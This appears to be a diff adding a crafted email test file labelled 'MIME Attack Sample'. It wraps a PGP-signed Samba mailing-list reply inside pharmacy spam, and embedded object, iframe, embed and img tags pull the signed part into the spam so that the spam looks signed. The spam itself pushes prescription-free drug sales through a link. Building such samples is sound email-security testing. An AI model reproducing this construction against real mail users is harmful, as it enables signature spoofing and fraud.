@@ -1,0 +1,92 @@
+From: msnhomeadvisor_035341@msnnewsletters.customer-email.com
+To: tara.sweitzer@enron.com, casey.evans@enron.com, w..white@enron.com
+Subject: MIME Attack Sample
+Content-Type: multipart/related; boundary="DELIMITER"
+--DELIMITER
+Content-Type: text/html
+Content-Type: text/html;
+Content-Transfer-Encoding: 7Bit
+
+<html>
+<body bgColor=#ffffff>
+<div align="left"><font face=Arial size=3>Hello, Would you like to spend less 
+  on your MEDICATIONS ?<br>
+  <a 
+href="http://greatkod.hk/?70759076">VlAGR@ Levltra CIALIS</a> and many other.<br>
+  </font><font face=Arial size=2></font><br>
+  <b><i><font color="#0072FF" size="+1"><I><B><font color="#003366">YOU NEED 15 
+  MINUTES TO BE READY FOR ACTION.</font></b></I></font> <br>
+  <br>
+  </i> </b> 
+  <table cellpadding="5">
+    <tr> 
+      <td bgcolor="#CC99CC"> <i><b> - All popular drugs are available (Viagra, 
+        Cialis,Levitra, Propecia and many many more )<br>
+        - Free shipping worlwide<br>
+        - No Doctor Visits<br>
+        - No Prescriptions<br>
+        - 100% Customer Satisfaction </b></i></td>
+    </tr>
+  </table>
+  <br>
+</div>
+<p align="left"><b><a href="http://greatkod.hk/?70759076"><font size="+2" color="#003333">Click 
+  here!<br>
+  <br>
+  </font></a></b><font face="Arial" size="+2"><font size="1">Have a nice day.</font></font><font size="+1"><i></i></font></p>
+  </body>
+</html>
+
+
+----8194087496990232521--
+
+<object width="100%" height="25" data="cid:target"></object>
+<iframe width="100%" height="25"  src="cid:target"></iframe>
+<embed  width="100%" height="25" src="cid:target"/></embed><img    width="100"  height="25"  src="cid:target">
+--DELIMITER
+Content-ID: <target>Content-Type: multipart/signed; boundary="BOUNDARY";  protocol="application/pgp-signature"
+--BOUNDARY
+Content-Type: text/plain
+Content-Transfer-Encoding: quoted-printable
+ SHA1
+
+Karolin,
+
+> Author: kseeger
+> Date: 2007-06-04 10:40:47 +0000 (Mon, 04 Jun 2007)
+> New Revision: 1120
+> 
+> WebSVN: http://websvn.samba.org/cgi-bin/viewcvs.cgi?view=rev&root=samba-docs&rev=1120
+> 
+> Log:
+> Add documentation for 'winbind:rpc only' in smb.conf manpage.
+> @Jerry: Please revert if your are not content with this.
+> 'ldapsam:trusted and 'ldapsam:editposix' are described in 
+> the smb.conf manpage, too.
+
+I would really like to see the parameteric options
+moved out to the relevant individual man pages.
+For example, IIRC volker add the "rpc only" option
+to winbindd(8).  The ldapsam options should be
+moved to a pdb_ldapsam(8) man pages (once we have one).
+
+Please revert this from the gargantuan smb.conf(5). :-)
+Thanks.
+
+
+
+cheers, jerry
+-BOUNDARY--
+Content-Type: application/pgp-signature; name="signature.asc"
+BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.6 (GNU/Linux)
+Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
+
+iD8DBQFGZAxmIR7qMdg1EfYRAkE+AJ4nObATtgfCgc4vYT6jeLt2KUqHKwCfUX4b
+8xDNilOEsJ3keO4TOhvKnuI=
+=7QSR
+-----END PGP SIGNATURE-----
+
+
+--BOUNDARY--
+--DELIMITER--
